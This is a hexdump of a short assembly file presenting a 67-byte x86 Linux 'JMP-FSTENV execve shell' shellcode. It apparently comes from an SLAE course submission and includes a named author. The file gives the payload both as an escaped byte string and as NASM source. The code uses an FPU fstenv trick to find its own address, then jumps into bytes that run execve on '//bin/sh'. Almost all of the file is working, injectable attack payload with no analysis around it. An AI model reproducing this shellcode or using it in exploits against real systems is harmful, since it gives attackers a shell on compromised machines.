00000000  3b 44 65 73 63 72 69 70  74 69 6f 6e 3a 20 20 20  |;Description:   |
00000010  4a 4d 50 2d 46 53 54 45  4e 56 20 65 78 65 63 76  |JMP-FSTENV execv|
00000020  65 20 73 68 65 6c 6c 20  28 36 37 20 62 79 74 65  |e shell (67 byte|
00000030  73 29 0a 3b 53 68 65 6c  6c 63 6f 64 65 3a 20 20  |s).;Shellcode:  |
00000040  20 20 20 5c 78 64 39 5c  78 65 65 5c 78 65 62 5c  |   \xd9\xee\xeb\|
00000050  78 33 34 5c 78 65 62 5c  78 32 35 5c 78 35 65 5c  |x34\xeb\x25\x5e\|
00000060  78 38 39 5c 78 66 37 5c  78 33 31 5c 78 63 30 5c  |x89\xf7\x31\xc0\|
00000070  78 35 30 5c 78 38 39 5c  78 65 32 5c 78 35 30 5c  |x50\x89\xe2\x50\|
00000080  78 38 33 5c 78 63 34 5c  78 30 33 5c 78 38 64 5c  |x83\xc4\x03\x8d\|
00000090  78 37 36 5c 78 30 34 5c  78 33 33 5c 78 30 36 5c  |x76\x04\x33\x06\|
000000a0  78 35 30 5c 78 33 31 5c  78 63 30 5c 78 33 33 5c  |x50\x31\xc0\x33\|
000000b0  78 30 37 5c 78 35 30 5c  78 38 39 5c 78 65 33 5c  |x07\x50\x89\xe3\|
000000c0  78 33 31 5c 78 63 30 5c  78 35 30 5c 78 38 64 5c  |x31\xc0\x50\x8d\|
000000d0  78 33 62 5c 78 35 37 5c  78 38 39 5c 78 65 31 5c  |x3b\x57\x89\xe1\|
000000e0  78 62 30 5c 78 30 62 5c  78 63 64 5c 78 38 30 5c  |xb0\x0b\xcd\x80\|
000000f0  78 65 38 5c 78 64 36 5c  78 66 66 5c 78 66 66 5c  |xe8\xd6\xff\xff\|
00000100  78 66 66 5c 78 32 66 5c  78 32 66 5c 78 36 32 5c  |xff\x2f\x2f\x62\|
00000110  78 36 39 5c 78 36 65 5c  78 32 66 5c 78 37 33 5c  |x69\x6e\x2f\x73\|
00000120  78 36 38 5c 78 39 62 5c  78 64 39 5c 78 37 34 5c  |x68\x9b\xd9\x74\|
00000130  78 32 34 5c 78 66 34 5c  78 35 39 5c 78 38 64 5c  |x24\xf4\x59\x8d\|
00000140  78 34 31 5c 78 30 34 5c  78 66 66 5c 78 65 30 0a  |x41\x04\xff\xe0.|
00000150  3b 41 75 74 68 6f 72 3a  20 20 20 20 20 20 20 20  |;Author:        |
00000160  50 61 6f 6c 6f 20 53 74  69 76 61 6e 69 6e 20 3c  |Paolo Stivanin <|
00000170  68 74 74 70 73 3a 2f 2f  67 69 74 68 75 62 2e 63  |https://github.c|
00000180  6f 6d 2f 70 6f 6c 73 6c  69 6e 75 78 3e 0a 3b 53  |om/polslinux>.;S|
00000190  4c 41 45 20 49 44 3a 20  20 20 20 20 20 20 35 32  |LAE ID:       52|
000001a0  36 0a 0a 67 6c 6f 62 61  6c 20 6d 61 69 6e 0a 73  |6..global main.s|
000001b0  65 63 74 69 6f 6e 20 2e  74 65 78 74 0a 6d 61 69  |ection .text.mai|
000001c0  6e 3a 0a 20 20 20 20 66  6c 64 7a 0a 20 20 20 20  |n:.    fldz.    |
000001d0  6a 6d 70 20 73 68 6f 72  74 20 68 65 72 65 0a 6d  |jmp short here.m|
000001e0  65 73 73 61 67 65 3a 20  64 62 20 30 78 65 62 2c  |essage: db 0xeb,|
000001f0  30 78 32 35 2c 30 78 35  65 2c 30 78 38 39 2c 30  |0x25,0x5e,0x89,0|
00000200  78 66 37 2c 30 78 33 31  2c 30 78 63 30 2c 30 78  |xf7,0x31,0xc0,0x|
00000210  35 30 2c 30 78 38 39 2c  30 78 65 32 2c 30 78 35  |50,0x89,0xe2,0x5|
00000220  30 2c 30 78 38 33 2c 30  78 63 34 2c 30 78 30 33  |0,0x83,0xc4,0x03|
00000230  2c 30 78 38 64 2c 30 78  37 36 2c 30 78 30 34 2c  |,0x8d,0x76,0x04,|
00000240  30 78 33 33 2c 30 78 30  36 2c 30 78 35 30 2c 30  |0x33,0x06,0x50,0|
00000250  78 33 31 2c 30 78 63 30  2c 30 78 33 33 2c 30 78  |x31,0xc0,0x33,0x|
00000260  30 37 2c 30 78 35 30 2c  30 78 38 39 2c 30 78 65  |07,0x50,0x89,0xe|
00000270  33 2c 30 78 33 31 2c 30  78 63 30 2c 30 78 35 30  |3,0x31,0xc0,0x50|
00000280  2c 30 78 38 64 2c 30 78  33 62 2c 30 78 35 37 2c  |,0x8d,0x3b,0x57,|
00000290  30 78 38 39 2c 30 78 65  31 2c 30 78 62 30 2c 30  |0x89,0xe1,0xb0,0|
000002a0  78 30 62 2c 30 78 63 64  2c 30 78 38 30 2c 30 78  |x0b,0xcd,0x80,0x|
000002b0  65 38 2c 30 78 64 36 2c  30 78 66 66 2c 30 78 66  |e8,0xd6,0xff,0xf|
000002c0  66 2c 30 78 66 66 2c 30  78 32 66 2c 30 78 32 66  |f,0xff,0x2f,0x2f|
000002d0  2c 30 78 36 32 2c 30 78  36 39 2c 30 78 36 65 2c  |,0x62,0x69,0x6e,|
000002e0  30 78 32 66 2c 30 78 37  33 2c 30 78 36 38 0a 68  |0x2f,0x73,0x68.h|
000002f0  65 72 65 3a 20 20 20 66  73 74 65 6e 76 20 5b 65  |ere:   fstenv [e|
00000300  73 70 2d 30 78 63 5d 0a  20 20 20 20 70 6f 70 20  |sp-0xc].    pop |
00000310  65 63 78 0a 20 20 20 20  6c 65 61 20 65 61 78 2c  |ecx.    lea eax,|
00000320  5b 65 63 78 2b 34 5d 0a  20 20 20 20 6a 6d 70 20  |[ecx+4].    jmp |
00000330  65 61 78                                          |eax|
00000333
